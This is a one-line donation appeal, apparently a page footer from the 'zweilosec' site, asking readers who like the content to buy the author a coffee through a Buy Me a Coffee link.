 If you like this content and would like to see more, please consider [buying me a coffee](https://www.buymeacoffee.com/zweilosec)!
+
